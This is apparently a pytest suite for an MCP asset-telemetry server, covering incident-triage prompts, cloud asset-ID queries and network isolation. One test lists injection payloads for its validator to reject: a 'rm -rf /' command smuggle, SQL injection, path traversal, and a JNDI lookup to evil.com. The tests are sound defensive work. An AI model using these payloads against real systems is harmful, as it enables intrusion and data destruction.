"""
Real-World & Synthetic Benchmark Verification Suite
Tests Enterprise Asset OS MCP Server against:
1. Synthetic format-compatible fixtures (Default offline CI execution).
2. Canonical research-licensed Loghub benchmarks (Opt-in via RUN_REAL_DATA=1 after fetch_real_fixtures.py).

Guarantees 100% deterministic offline test isolation with zero unconsented data bundling.
"""
import json
import os
from pathlib import Path
import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError
from server import mcp


@pytest.fixture(autouse=True)
def block_external_network_calls(monkeypatch):
    """Enforce strict test isolation: block real network socket connections to external endpoints."""
    import socket
    original_connect = socket.socket.connect

    def guarded_connect(self, address):
        host, port = address[0], address[1]
        if host not in ("127.0.0.1", "localhost", "::1"):
            raise ConnectionRefusedError(
                f"Test isolation guard: external network access to {host}:{port} is forbidden in CI suite."
            )
        return original_connect(self, address)

    monkeypatch.setattr(socket.socket, "connect", guarded_connect)


@pytest.fixture
def synthetic_fixtures():
    path = Path(__file__).parent / "data" / "synthetic_fixtures.json"
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)


@pytest.fixture
def real_incidents():
    path = Path(__file__).parent / "data" / "real_incidents.json"
    if not path.exists():
        pytest.skip("real_incidents.json not present — run fetch_real_fixtures.py first.")
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)


REAL_DATA_SKIP_REASON = (
    "Loghub data not fetched — license is research/academic, review terms; "
    "run fetch_real_fixtures.py to enable"
)


# ==============================================================================
# SECTION 1: DEFAULT OFFLINE TESTS (Synthetic — Format-Compatible)
# ==============================================================================

@pytest.mark.asyncio
async def test_synthetic_incident_auth_burst(synthetic_fixtures):
    """Verify triage prompt handles synthetic production-mimicking PAM auth failure bursts."""
    incident = next(i for i in synthetic_fixtures["incidents"] if i["id"] == "INC-SYNTH-AUTH-001")
    raw_log = incident["raw_log"]

    async with Client(mcp) as client:
        prompt = await client.get_prompt("incident_triage_prompt", {"incident_log": raw_log})
        prompt_text = prompt.messages[0].content.text

        assert "Senior SRE" in prompt_text
        assert "sshd" in prompt_text
        assert "authentication failure" in prompt_text
        assert "198.51.100.45" in prompt_text


@pytest.mark.asyncio
async def test_synthetic_incident_storage_timeout(synthetic_fixtures):
    """Verify triage prompt handles synthetic storage timeout exception logs."""
    incident = next(i for i in synthetic_fixtures["incidents"] if i["id"] == "INC-SYNTH-STORAGE-002")
    raw_log = incident["raw_log"]

    async with Client(mcp) as client:
        prompt = await client.get_prompt("incident_triage_prompt", {"incident_log": raw_log})
        prompt_text = prompt.messages[0].content.text

        assert "Senior SRE" in prompt_text
        assert "VolumeBackendException" in prompt_text
        assert "192.0.2.84:3260" in prompt_text


@pytest.mark.asyncio
async def test_synthetic_incident_cluster_disconnect(synthetic_fixtures):
    """Verify triage prompt handles synthetic cluster supervisor node disconnects."""
    incident = next(i for i in synthetic_fixtures["incidents"] if i["id"] == "INC-SYNTH-CLUSTER-003")
    raw_log = incident["raw_log"]

    async with Client(mcp) as client:
        prompt = await client.get_prompt("incident_triage_prompt", {"incident_log": raw_log})
        prompt_text = prompt.messages[0].content.text

        assert "connection reset by peer" in prompt_text
        assert "Under-replicated blocks" in prompt_text


@pytest.mark.asyncio
async def test_query_synthetic_aws_ec2_node():
    """Verify telemetry queries for AWS EC2 instance identifier format."""
    async with Client(mcp) as client:
        result = await client.call_tool("query_telemetry", {"asset_id": "i-0a81b2c3d4e5f6789"})
        data = result.data
        assert data["asset_id"] == "i-0a81b2c3d4e5f6789"
        assert data["telemetry"]["status"] == "active"
        assert data["telemetry"]["cores"] == 16


@pytest.mark.asyncio
async def test_query_synthetic_gke_cluster_node():
    """Verify telemetry queries for Google Kubernetes Engine node naming schema."""
    async with Client(mcp) as client:
        result = await client.call_tool("query_telemetry", {"asset_id": "gke-prod-cluster-pool-1-a1b2"})
        data = result.data
        assert data["telemetry"]["region"] == "us-central1-a"
        assert data["telemetry"]["load_pct"] == 55.3


@pytest.mark.asyncio
async def test_query_synthetic_aks_node():
    """Verify telemetry queries for Azure AKS Virtual Machine Scale Set naming schema."""
    async with Client(mcp) as client:
        result = await client.call_tool("query_telemetry", {"asset_id": "aks-nodepool1-28491028-vmss000001"})
        data = result.data
        assert data["telemetry"]["status"] == "rebooting"
        assert data["telemetry"]["cores"] == 8


@pytest.mark.asyncio
async def test_query_synthetic_baremetal_fqdn():
    """Verify telemetry queries for internal FQDN hostnames with dots."""
    async with Client(mcp) as client:
        result = await client.call_tool("query_telemetry", {"asset_id": "node-worker-01.infra.internal"})
        data = result.data
        assert data["telemetry"]["region"] == "me-central-1"
        assert data["telemetry"]["ram_total_gb"] == 128.0


@pytest.mark.asyncio
async def test_prometheus_offline_deterministic_fallback():
    """Verify Prometheus adapter is strictly deterministic and offline when TELEMETRY_PROMETHEUS_URL is unset."""
    from enterprise_asset_os.server import fetch_prometheus_node_telemetry
    res = await fetch_prometheus_node_telemetry("node-test", "")
    assert res is None


@pytest.mark.asyncio
async def test_prometheus_adapter_with_mocked_response(monkeypatch):
    """Verify Prometheus JSON-RPC parsing works with mock payload while preserving test isolation."""
    from enterprise_asset_os.server import fetch_prometheus_node_telemetry
    import urllib.request

    mock_json = json.dumps({
        "status": "success",
        "data": {
            "result": [
                {
                    "metric": {"job": "node-exporter", "instance": "server-live-01"},
                    "value": [1726610000, "1"]
                }
            ]
        }
    }).encode("utf-8")

    class MockResponse:
        status = 200
        def read(self):
            return mock_json
        def __enter__(self):
            return self
        def __exit__(self, *args):
            pass

    def mock_urlopen(req, timeout=3):
        return MockResponse()

    monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen)

    data = await fetch_prometheus_node_telemetry("server-live-01", "http://prometheus.mock.internal:9090")
    assert data is not None
    assert data["status"] == "active"
    assert data["source"] == "live_prometheus"


@pytest.mark.asyncio
async def test_malicious_vectors_rejected():
    """Verify adversarial payloads mimicking log injection and traversal are rejected."""
    attack_vectors = [
        "../../var/log/syslog",
        "node-01; rm -rf /",
        "i-0123' OR '1'='1",
        "${jndi:ldap://evil.com/a}",
        "node\x00hidden",
        "node:port/path",
    ]

    async with Client(mcp) as client:
        for payload in attack_vectors:
            with pytest.raises(ToolError) as exc_info:
                await client.call_tool("query_telemetry", {"asset_id": payload})
            assert "Invalid asset ID format" in str(exc_info.value)


# ==============================================================================
# SECTION 2: OPT-IN REAL TESTS (Canonical Research-Licensed Loghub Benchmarks)
# ==============================================================================

@pytest.mark.skipif(
    os.environ.get("RUN_REAL_DATA") != "1",
    reason=REAL_DATA_SKIP_REASON,
)
@pytest.mark.asyncio
async def test_opt_in_real_incident_linux_auth_burst(real_incidents):
    """[OPT-IN] Verify triage prompt against canonical Loghub Linux auth failures."""
    linux_incident = next(i for i in real_incidents if i["id"] == "INC-LOGHUB-LINUX-001")
    raw_log = linux_incident["raw_log"]

    async with Client(mcp) as client:
        prompt = await client.get_prompt("incident_triage_prompt", {"incident_log": raw_log})
        prompt_text = prompt.messages[0].content.text

        assert "Senior SRE" in prompt_text
        assert "sshd(pam_unix)" in prompt_text
        assert "authentication failure" in prompt_text
        assert "220-135-151-1.hinet-ip.hinet.net" in prompt_text


@pytest.mark.skipif(
    os.environ.get("RUN_REAL_DATA") != "1",
    reason=REAL_DATA_SKIP_REASON,
)
@pytest.mark.asyncio
async def test_opt_in_real_incident_openstack_nova_cache(real_incidents):
    """[OPT-IN] Verify triage prompt against canonical Loghub OpenStack nova imagecache warnings."""
    storage_incident = next(i for i in real_incidents if i["id"] == "INC-LOGHUB-OPENSTACK-002")
    raw_log = storage_incident["raw_log"]

    async with Client(mcp) as client:
        prompt = await client.get_prompt("incident_triage_prompt", {"incident_log": raw_log})
        prompt_text = prompt.messages[0].content.text

        assert "nova-compute" in prompt_text
        assert "Unknown base file: /var/lib/nova/instances/_base/a489c868f0c37da93b76227c91bb03908ac0e742" in prompt_text
        assert "HTTP exception thrown: No instances found for any event" in prompt_text


@pytest.mark.skipif(
    os.environ.get("RUN_REAL_DATA") != "1",
    reason=REAL_DATA_SKIP_REASON,
)
@pytest.mark.asyncio
async def test_opt_in_real_incident_hdfs_datanode_io_exceptions(real_incidents):
    """[OPT-IN] Verify triage prompt against canonical Loghub HDFS block transmission exceptions."""
    hdfs_incident = next(i for i in real_incidents if i["id"] == "INC-LOGHUB-HDFS-003")
    raw_log = hdfs_incident["raw_log"]

    async with Client(mcp) as client:
        prompt = await client.get_prompt("incident_triage_prompt", {"incident_log": raw_log})
        prompt_text = prompt.messages[0].content.text

        assert "dfs.DataNode$DataXceiver" in prompt_text
        assert "Got exception while serving blk_-2918118818249673980" in prompt_text
        assert "10.251.30.85:50010" in prompt_text


@pytest.mark.skipif(
    os.environ.get("RUN_REAL_DATA") != "1",
    reason=REAL_DATA_SKIP_REASON,
)
@pytest.mark.asyncio
async def test_opt_in_query_loghub_hdfs_datanode():
    """[OPT-IN] Verify telemetry queries for genuine HDFS DataNode extracted from canonical logs."""
    async with Client(mcp) as client:
        result = await client.call_tool("query_telemetry", {"asset_id": "10.251.30.85:50010"})
        data = result.data
        assert data["asset_id"] == "10.251.30.85:50010"
        assert data["telemetry"]["status"] == "degraded"
        assert data["telemetry"]["provider"] == "loghub-hdfs-datanode"


@pytest.mark.skipif(
    os.environ.get("RUN_REAL_DATA") != "1",
    reason=REAL_DATA_SKIP_REASON,
)
@pytest.mark.asyncio
async def test_opt_in_query_loghub_openstack_vm():
    """[OPT-IN] Verify telemetry queries for genuine OpenStack instance extracted from Nova logs."""
    async with Client(mcp) as client:
        result = await client.call_tool("query_telemetry", {"asset_id": "b9000564-fe1a-409b-b8cc-1e88b294cd1d"})
        data = result.data
        assert data["asset_id"] == "b9000564-fe1a-409b-b8cc-1e88b294cd1d"
        assert data["telemetry"]["status"] == "active"
        assert data["telemetry"]["provider"] == "loghub-openstack-vm"
